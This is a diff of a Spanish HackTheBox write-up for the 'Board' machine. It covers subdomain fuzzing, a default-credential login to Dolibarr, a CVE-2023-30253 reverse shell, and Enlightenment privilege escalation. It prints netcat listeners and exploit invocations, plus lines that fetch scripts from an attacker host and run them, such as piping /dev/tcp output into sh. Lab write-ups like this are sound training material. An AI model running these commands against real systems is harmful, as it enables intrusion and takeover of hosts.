@@ -15,18 +15,21 @@ parent: HackTheBox
 ---
 
 ## Reconocimiento
+&nbsp;
 
 Primero comprobaremos que la máquina esta activa con nmap que solo envíe un ping:
 
 ```bash
 nmap -sn 10.10.11.11
 ```
+&nbsp;
 
 Comprobamos que podemos hacerle ping, por lo que ahora pasaremos a hacer un reconocimiento más intensivo, para saber que puertos tiene abiertos. Hacemos un escaneo de todos los puertos TCP abiertos sin descubrimiento de hosts ni resolución DNS exportando a un archivo grepeable.
 
 ```bash
 nmap -p- -sS --open --min-rate 5000 10.10.11.11 -n -Pn -oG allPorts
 ```
+&nbsp;
 
 Se nos muestra que hay dos puertos abiertos, el 22 y el 80. Con la utilidad **extractPorts** podemos extraer los puertos y poder pegarlos de forma más fácil.
 
@@ -58,6 +61,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
 ```
+&nbsp;
 
 Podemos ver que es una máquina Ubuntu con un servicio web Apache 2.4.41
 
@@ -66,80 +70,97 @@ Al abrirla en el navegador nos encontramos con un home con un menú lateral dere
 Interceptamos que es una petición con xml, pero no podemos hacer más por esta parte.
 
 ![](/assets/images/Imagenes/Pasted image 20240912230937.png)
-
+&nbsp;
 
 Después de esto, podemos probar a realizar un escaneo de subdominios para averiguar si hay más portales con alguna posibilidad de explotación. Para ello primero deberemos añadir a la lista de hosts la resolución de ip de la máquina, en este caso la 10.10.11.11 con dirección **board.htb**.
 
 ![](/assets/images/Imagenes/Pasted image 20240912232117.png)
+&nbsp;
 
 Después con la herramienta **ffuf** buscaremos subdominios que pueda tener el servidor. Con el siguiente comando buscamos con el diccionario de el repositorio de SecLists cualquier coincidencia con el millón de subdominios más usados, comparando el parámetro que le indiquemos, en este caso un subdominio de board.htb, y obviando en este caso, ya que salen demasiadas coincidencias, los resultados con un tamaño de 15949.
 
 ```shell
 ffuf -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -fs 15949
 ```
+&nbsp;
 
 Es más recomendable filtrar por el tamaño, de palabras o de líneas que por el estado de la página.
 
 Tras realizarlo y filtrar tenemos como coincidencia el subdominio **crm**.
 
 ![](/assets/images/Imagenes/Pasted image 20240912233227.png)
+&nbsp;
 
 Después, al igual que hemos hecho con el dominio, para resolver la dirección deberemos añadir al archivo **/etc/hosts** la dirección y resolución DNS.
 
 ![](/assets/images/Imagenes/Pasted image 20240912233405.png)
+&nbsp;
 
 Al acceder al subdominio nos aparece una página de login de un gestor de contenido llamado Dolibarr.
 
 ![](/assets/images/Imagenes/Pasted image 20240912233548.png)
+&nbsp;
 
 Podemos buscar las credenciales por defecto antes de intentar cualquier método de fuerza bruta. En este caso para Dolibarr en su versión 17 es **admin/admin**.
 
 ![](/assets/images/Imagenes/Pasted image 20240912233822.png)
+&nbsp;
 
 Con ello conseguimos iniciar sesión en el gestor, pero no tenemos permisos de administrador. Podríamos probar a intentar cambiar el id de usuario en detalles de este.
 
 ![](/assets/images/Imagenes/Pasted image 20240912234956.png)
+&nbsp;
 
 Sin embargo está protegido ante estos ataques:
 
 ![](/assets/images/Imagenes/Pasted image 20240912235031.png)
+&nbsp;
 
 Por último podemos buscar por vulnerabilidades de la versión de la aplicación web, como hemos visto Dolibarr 17, y ver si es posible explotarla. Al buscar vemos que existe la CVE-2023-30253.
+&nbsp;
 
 ## Explotación
+&nbsp;
 
 ![](/assets/images/Imagenes/Pasted image 20240912235301.png)
+&nbsp;
 
 En este caso es poder generar una reverse shell a través de inyección PHP.
 
 ![](/assets/images/Imagenes/Pasted image 20240912235515.png)
+&nbsp;
 
 Podemos ver los parámetros que tiene para realizar el ataque. Para ejecutarlo, primero deberemos estar en escucha por un puerto para captar la reverse shell, en este caso usando netcat.
 
 ```shell
 nc -lvnp 443
 ```
+&nbsp;
 
 Después ejecutaremos el código para conseguir la reverse shell:
 
 ```shell
 python3 exploit.py http://crm.board.htb admin admin 10.10.14.169 443
 ```
+&nbsp;
 
 Con esto ejecutamos el exploit hacia el dominio seleccionado con el usuario y contraseña creados **admin/admin** y que se realice por el puerto 443 hacia nuestra IP. Con esto conseguiremos la reverse shell captada con netcat.
 
 ![](/assets/images/Imagenes/Pasted image 20240913000153.png)
+&nbsp;
 
 Ya dentro de la máquina podemos buscar formas de ganar privilegios, ya que somos el usuario www-data. Buscando entre archivos, el archivo /www/html/crm.board.htb/htdocs/conf/conf.php contiene datos de inicio de sesión de un usuario:
 
 ![](/assets/images/Imagenes/Pasted image 20240913000803.png)
+&nbsp;
 
 Comprobamos que funciona:
 
-
 ![](/assets/images/Imagenes/Pasted image 20240913001102.png)
+&nbsp;
 
 ## Escalada de privilegios
+&nbsp;
 
 Dentro del directorio del usuario larissa está la flag de usuario. Después para escalar privilegios usaremos la utilidad **LinPeas** (Linux Privilege Scalation). Para ello debemos descargar el script y después que la máquina víctima lo ejecute de nuestro dispositivo.
 
@@ -148,6 +169,7 @@ Primero con netcat montaremos un servidor con el archivo:
 ```shell
 sudo nc -q 5 -lvnp 80 < linpeas.sh
 ```
+&nbsp;
 
 Después pediremos desde la máquina víctima a la que tenemos acceso a ejecutar ese script.
 
@@ -156,6 +178,7 @@ cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
 ![](/assets/images/Imagenes/Pasted image 20240913004817.png)
+&nbsp;
 
 
 Tras correr el script vemos que hay varios archivos que usarse para escalar privilegios
@@ -188,13 +211,13 @@ Tras correr el script vemos que hay varios archivos que usarse para escalar priv
 -rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper
 
 ```
+&nbsp;
 
-
-Podemos ver que puede que haya una vulnerabilidad con la utilidad enligtenment de linux.
+Podemos buscar si exite una vulnerabilidad con la utilidad enligtenment de linux.
 
 [Vulnerabilidad Enlightenment v.0.25.3 - Escalada de privilegios](https://www.exploit-db.com/exploits/51180)
 
-https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706
+[Exploit de la vulnerabilidad en gitub](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706)
 
 Descargamos el script, e igual que anteriormente montamos un servidor con python para desde la máquina víctima recoger el script y ejecutarlo.
 
@@ -203,13 +226,14 @@ Host atacante
 ```shell
 python3 -m http.server 80 
 ```
-
+&nbsp;
 
 Máquina víctima
 
 ```shell
 wget 10.10.14.169/exploit.sh
 ```
+&nbsp;
 
 Después le damos permiso con **chmod +x exploit.sh** y lo ejecutaremos, ganando acceso root:
 
